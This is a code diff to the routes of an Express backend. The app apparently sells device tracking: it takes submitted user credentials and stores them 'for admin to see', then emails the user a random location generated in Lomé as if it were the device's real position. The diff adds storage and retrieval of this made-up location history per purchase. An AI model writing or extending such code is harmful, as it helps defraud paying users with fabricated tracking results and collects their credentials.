@@ -192,7 +192,7 @@ export async function registerRoutes(app: Express): Promise<Server> {
         // We continue because the record is already in DB for admin to see
       }
 
-      res.json({ success: true, message: 'Credentials submitted successfully' });
+      res.json({ success: true, message: 'Credentials submitted successfully', purchaseId: purchase.id });
     } catch (error) {
       console.error('Error submitting credentials:', error);
       res.status(500).json({ error: 'Internal server error' });
@@ -224,7 +224,7 @@ export async function registerRoutes(app: Express): Promise<Server> {
   // Send location to user
   app.post('/api/send-location', async (req, res) => {
     try {
-      const { userEmail, device } = req.body;
+      const { userEmail, device, purchaseId } = req.body;
 
       if (!userEmail || !device) {
         return res.status(400).json({ error: 'Missing required fields' });
@@ -232,6 +232,17 @@ export async function registerRoutes(app: Express): Promise<Server> {
 
       // Generate random location in Lomé
       const coordinates = generateLomeLocation();
+      
+      // Save to history if purchaseId is provided
+      if (purchaseId) {
+        await storage.addLocationHistory({
+          purchaseId,
+          lat: coordinates[0].toString(),
+          lng: coordinates[1].toString(),
+          timestamp: new Date().toISOString()
+        });
+      }
+
       const emailSent = await sendLocationToUser(userEmail, device, coordinates);
 
       if (emailSent) {
@@ -241,6 +252,17 @@ export async function registerRoutes(app: Express): Promise<Server> {
       }
     } catch (error) {
       console.error('Error sending location:', error);
+      res.status(500).json({ error: 'Internal server error' });
+    }
+  });
+
+  // Get location history
+  app.get('/api/purchases/:id/history', async (req, res) => {
+    try {
+      const purchaseId = parseInt(req.params.id);
+      const history = await storage.getLocationHistory(purchaseId);
+      res.json(history);
+    } catch (error) {
       res.status(500).json({ error: 'Internal server error' });
     }
   });
